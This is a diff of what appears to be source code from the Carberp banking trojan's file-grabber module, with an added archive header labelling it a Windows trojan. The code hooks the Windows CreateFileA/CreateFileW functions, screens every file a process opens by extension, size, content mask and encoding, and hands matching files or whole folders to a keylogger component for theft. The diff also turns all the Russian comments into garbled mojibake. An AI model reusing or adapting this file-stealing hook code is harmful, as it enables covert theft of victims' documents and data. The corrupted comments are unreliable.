@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "UniversalKeyLogger.h"
 #include "FileGrabber.h"
 #include "Memory.h"
@@ -14,7 +25,7 @@ namespace FILEGRABBERDEBUGSTRINGS
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define DBG FILEGRABBERDEBUGSTRINGS::DBGOutMessage<>
 
 namespace FileGrabber {
@@ -22,24 +33,24 @@ namespace FileGrabber {
 TypeCreateFileW Real_CreateFileW;
 TypeCreateFileA Real_CreateFileA;
 
-PList receivers = 0; //получатели
-DWORD PID = 0; //для предотвращения повторной инициализации
-int stateGrabber = 0; //состояние граббера
+PList receivers = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+DWORD PID = 0; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+int stateGrabber = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 static bool IsBin( BYTE* data, int szData )
 {
-	//считаем частоту символов
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int s[256];
 	m_memset(s, 0, sizeof(s));
 
 	for( int i = 0; i < szData; i++ ) s[data[i]]++;
 
-	//средняя частота символа
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int avg = szData / 256;
-	//начало и конец диапазона равномерно распределенных частот
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	int min = avg - avg / 2 - 1; if( min <= 0 ) min = 1;
 	int max = avg + avg / 2 + 1;
-	//подсчитываем количество попаданий частот в диапазоне [m1;m2]
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ [m1;m2]
    	int m1 = 0, m2 = 0;
 	for( int i = 0; i < 256; i++ )
 		if( s[i] )
@@ -47,20 +58,20 @@ static bool IsBin( BYTE* data, int szData )
 				m1++;
 			else
 				m2++;
-	//если частоты равномерно распределены, то количество попаданий
-	//должно быть примерно на 25% больше
+	//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ 25% пїЅпїЅпїЅпїЅпїЅпїЅ
 	if( m1 * 75 / 100 > m2 )
 		return true;
 	return false;
 }
 
-//проверяет являются ли данные кодировкой base64
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ base64
 static bool IsBase64( BYTE* data, int szData )
 {
-	int sz = 0; //количество символов в data, исключаются переводі строк
-	int max = 0; //максимальная длина последовательности символов кодировки base64
-	int len = 0; //подсчет строчки символов
-	int rows = 0; //количество строк
+	int sz = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ data, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	int max = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ base64
+	int len = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	int rows = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	for( int i = 0; i < szData; i++ )
 	{
 		char c = data[i];
@@ -81,7 +92,7 @@ static bool IsBase64( BYTE* data, int szData )
 			rows++;
 
 	}
-	if( len * 100 / sz > 70 && rows > 0 ) //большинство текста это кодировка base64, а ткаже если разбиты на строки
+	if( len * 100 / sz > 70 && rows > 0 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ base64, пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		return true;
 	return false;
 }
@@ -102,7 +113,7 @@ static DWORD CalcExtHash( const wchar_t* fileName )
 	return 0;
 }
 
-//прповеряет является ли файл нужного нам расширения
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static bool IsExt( DWORD hash, DWORD* exts )
 {
 	if( exts == 0 ) return false;
@@ -123,15 +134,15 @@ static int FilterExt( const ParamEvent& e, Receiver* rv )
 		DWORD hash =  e.unicode ? CalcExtHash(e.fileNameW) : CalcExtHash(e.fileNameA);
 		if( rv->ignoreExt )
 			if( IsExt( hash, rv->ignoreExt ) )
-				ret = 1; //файл имеет расширение из-за которого он игнорируется
+				ret = 1; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if( rv->neededExt )
 			if( IsExt( hash, rv->neededExt ) )
-				ret = 2; //файл имеет расширение из-за которого файл передается пользовательскому обработчику
+				ret = 2; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	}
 	return ret;
 }
 
-//проверяет по нескольким первым байтам, содержимого файла, формат файла 
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 
 static bool IsFormatBeg( const ParamEvent& e, Receiver* rv )
 {
 	int n = 0;
@@ -140,7 +151,7 @@ static bool IsFormatBeg( const ParamEvent& e, Receiver* rv )
 	{
 		for( int i = 0; i <= MaxLenIgnoreBeg; i++ )
 		{
-			if( i == MaxLenIgnoreBeg || (rv->ignoreBeg[n][i] == 0 && i > 0) ) //строка совпала
+			if( i == MaxLenIgnoreBeg || (rv->ignoreBeg[n][i] == 0 && i > 0) ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			{
 				res = true;
 				break;
@@ -153,19 +164,19 @@ static bool IsFormatBeg( const ParamEvent& e, Receiver* rv )
 	return res;
 }
 
-//загрузка файла, если не был загружен раньше
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 static bool LoadFile( ParamEvent& e )
 {
-	if( e.data ) return true; //файл был уже загружен
-	e.data = (BYTE*)MemAlloc(e.szData + 1); //на 1 больше для конечного нуля, чтобы потом проводить поиск по маске
+	if( e.data ) return true; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	e.data = (BYTE*)MemAlloc(e.szData + 1); //пїЅпїЅ 1 пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if( e.data ) 
 	{
 		DWORD size = 0;
-		pReadFile( e.file, e.data, e.szData, &size, NULL ); //читаем весь файл в память
+		pReadFile( e.file, e.data, e.szData, &size, NULL ); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		pSetFilePointer( e.file, 0, 0, FILE_BEGIN );
-		if( size == e.szData ) //действительно все прочли
+		if( size == e.szData ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		{
-			((char*)e.data)[e.szData] = 0; //файл представляем как строку
+			((char*)e.data)[e.szData] = 0; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			return true;
 		}
 		else
@@ -177,7 +188,7 @@ static bool LoadFile( ParamEvent& e )
 	return false;
 }
 
-//Проверяет каждого получателя и отсылаем им оповещения о срабатывании хука, согласно условиям получателя
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 void SendEvent( ParamEvent& e )
 {
 	if( !receivers )
@@ -186,15 +197,15 @@ void SendEvent( ParamEvent& e )
 	for( int i = 0; i < count; i++ )
 	{
 		Receiver* rv = (Receiver*)List::GetItem( receivers, i );
-		if( !rv->ignore && e.access & rv->access ) //тип доступа
+		if( !rv->ignore && e.access & rv->access ) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
-			int send = 0; //слать событие (>0) или нет (=0)
+			int send = 0; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (>0) пїЅпїЅпїЅ пїЅпїЅпїЅ (=0)
 			int extFilter = FilterExt( e, rv );
-			if( extFilter > 0 ) //фильтер сработал
+			if( extFilter > 0 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			{
-				if( extFilter == 2 ) //файл нужного нам расширения
+				if( extFilter == 2 ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				{
-					if( rv->aw & LOADFILE ) //нужно загрузить
+					if( rv->aw & LOADFILE ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 						LoadFile(e);
 					send = 1;
 				}
@@ -203,20 +214,20 @@ void SendEvent( ParamEvent& e )
 			{
 				DWORD h;
  				e.szData = (DWORD)pGetFileSize( e.file, &h );
-				//подходит ли размер
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				if( e.szData >= rv->minSize && (e.szData <= rv->maxSize || rv->maxSize < 0))
 				{	
 					if( rv->maska || rv->aw & FILEISBIN || rv->ignoreBeg[0][0] )
 					{
 						if( LoadFile(e) )
 						{
-							if( !IsFormatBeg( e, rv ) ) //файл не игнорируемого формата
+							if( !IsFormatBeg( e, rv ) ) //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 							{
-								//если есть какой-то из фильтров, то сообщаем только тогда когда есть реакция на один из них
-								bool filters = false; //проходил ли через какой-то фильтер
+								//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ
+								bool filters = false; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 								for(;;)
 								{
-									//проверяем маску
+									//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 									if( rv->maska )
 									{
 										filters = true;
@@ -243,7 +254,7 @@ void SendEvent( ParamEvent& e )
 											send = 4; break;
 										}
 									}
-									if( filters ) send = 0; //если ни один из фильтров не сработал, то сообщение не шлем
+									if( filters ) send = 0; //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 									break;
 								}
 							}	
@@ -251,9 +262,9 @@ void SendEvent( ParamEvent& e )
 					}
 					else
 					{
-						if( rv->aw & LOADFILE ) //нужно загрузить
+						if( rv->aw & LOADFILE ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 							LoadFile(e);
-						send = 5; //нужно оповещать о файлах определенного размера
+						send = 5; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					}
 				}
 			}
@@ -262,37 +273,37 @@ void SendEvent( ParamEvent& e )
 				e.nameSend[0] = 0;
 				if( e.unicode )
 				{
-					DBG("FileGrabberW", "Отреагировали на файл '%ls'(%d), size: %d", e.fileNameW, send, e.szData );
+					DBG("FileGrabberW", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ '%ls'(%d), size: %d", e.fileNameW, send, e.szData );
 					e.fileName = WSTR::ToAnsi( e.fileNameW, 0 );
 				}
 				else
 				{
-					DBG("FileGrabberA", "Отреагировали на файл '%s'(%d), size: %d", e.fileNameA, send, e.szData );
+					DBG("FileGrabberA", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ '%s'(%d), size: %d", e.fileNameA, send, e.szData );
 					e.fileName = (char*)e.fileNameA;
 				}
 
 				e.shortName = File::ExtractFileNameA( e.fileName, false );
-				//ищем расширение
+				//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				e.extFile = 0;
 				const char* p = STR::ScanEnd( (char*)e.shortName, '.' ); 
 				if( p ) e.extFile = p + 1; 
 
 				int res = rv->FuncReceiver(&e);
 
-				if( res & SENDFILE ) //если возвращает SENDFILE, то отправляем содержимое
+				if( res & SENDFILE ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ SENDFILE, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				{
 					if( e.data )
 					{
 						const char* nameSend = "FileGrabber";
-						if( res & CURRNAMEFILE ) //извлекаем имя из полного имени файла
+						if( res & CURRNAMEFILE ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 							nameSend = e.shortName;
 						else
-							if( res & CURRFULLNAMEFILE ) //имя файла с полными путями
+							if( res & CURRFULLNAMEFILE ) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 								nameSend = e.fileName;
 							else
-								if( e.nameSend[0] ) //имя передал получатель
+								if( e.nameSend[0] ) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 									nameSend = e.nameSend;
-						DBG( "FileGrabber", "Отправили файл '%s' под именем '%s'", e.fileName, nameSend );
+						DBG( "FileGrabber", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ '%s' пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ '%s'", e.fileName, nameSend );
 						KeyLogger::AddFile( 0, (char*)nameSend, e.data, e.szData );
 					}
 				}
@@ -300,7 +311,7 @@ void SendEvent( ParamEvent& e )
 					if( res & SENDFOLDER )
 					{
 						pPathRemoveFileSpecA(e.fileName);
-						//добавляем в конце слеш, так функция PathRemoveFileSpec его убирает
+						//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ PathRemoveFileSpec пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 						int sz = m_lstrlen(e.fileName);
 						if( e.fileName[sz - 1] != '\\' )
 						{
@@ -308,15 +319,15 @@ void SendEvent( ParamEvent& e )
 							e.fileName[sz + 1] = 0;
 							sz++;
 						}
-						DBG( "FileGrabber", "Отправляем папку '%s' под именем '%s'", e.fileName, e.nameSend );
+						DBG( "FileGrabber", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ '%s' пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ '%s'", e.fileName, e.nameSend );
 						int currState = stateGrabber;
-						stateGrabber |= IGNOREHOOK; //отключаем граббер
+						stateGrabber |= IGNOREHOOK; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 						KeyLogger::AddDirectory( e.fileName, e.nameSend );
-						stateGrabber = currState; //восстанавливаем состояние
+						stateGrabber = currState; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					}
 				if( res & STOPRECEIVER )
 					rv->ignore = true;
-				if( e.fileName != e.fileNameA ) //освобождаем память, если была перекодировка
+				if( e.fileName != e.fileNameA ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					STR::Free(e.fileName);
 			}
 		}
@@ -328,10 +339,10 @@ void SendEvent( ParamEvent& e )
 HANDLE WINAPI Hook_CreateFileA( LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
 {
 	HANDLE File = Real_CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
-	if( (stateGrabber & IGNOREHOOK) == 0 && (dwFlagsAndAttributes & FILE_FLAG_OVERLAPPED) == 0 && lpFileName && lpFileName[0] != '/' && lpFileName[0] != '\\' ) //игнорируем открытие разных портов
+	if( (stateGrabber & IGNOREHOOK) == 0 && (dwFlagsAndAttributes & FILE_FLAG_OVERLAPPED) == 0 && lpFileName && lpFileName[0] != '/' && lpFileName[0] != '\\' ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 	//DBG("FileGrabberA", "%s", lpFileName);
-		//инициализация параметров события
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		ParamEvent e;
 		e.data = 0;
 		e.szData = 0;
@@ -339,7 +350,7 @@ HANDLE WINAPI Hook_CreateFileA( LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD 
 		e.unicode = false;
 		e.access = dwDesiredAccess;
 		e.file = File;
-		SendEvent(e); //посылаем событие
+		SendEvent(e); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	}
 	return File;
 }
@@ -348,10 +359,10 @@ HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD
 {
 	HANDLE File = Real_CreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
 
-	if( (stateGrabber & (IGNOREHOOK | INHOOK)) == 0 && (dwFlagsAndAttributes & FILE_FLAG_OVERLAPPED) == 0 && lpFileName && lpFileName[0] != '/' && lpFileName[0] != '\\' ) //игнорируем открытие разных портов
+	if( (stateGrabber & (IGNOREHOOK | INHOOK)) == 0 && (dwFlagsAndAttributes & FILE_FLAG_OVERLAPPED) == 0 && lpFileName && lpFileName[0] != '/' && lpFileName[0] != '\\' ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		//stateGrabber |= INHOOK;
-		//инициализация параметров события
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		ParamEvent e;
 		e.data = 0;
 		e.szData = 0;
@@ -361,13 +372,13 @@ HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD
 		e.access = dwDesiredAccess;
 		e.file = File;
 
-	   	SendEvent(e); //посылаем событие
+	   	SendEvent(e); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		//stateGrabber &= ~INHOOK;
 	}
 	return File;
 }
 
-//удаление получателя при уничтожении списка
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 void DelReceiver(void* p)
 {
 	Receiver* pp = (Receiver*)p;
@@ -378,12 +389,12 @@ void DelReceiver(void* p)
 
 bool Init( int flags )
 {
-	if( !IsNewProcess(PID) ) //в том же процессе, инициализация уже была
-		return true; //инициализация уже была, поэтому говорим, что инициализация успешная
+	if( !IsNewProcess(PID) ) //пїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+		return true; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	receivers = List::Create();
 	if( !receivers )
 		return false;
-	List::SetFreeItemMehod( receivers, DelReceiver ); //для автоматического удаления получателей
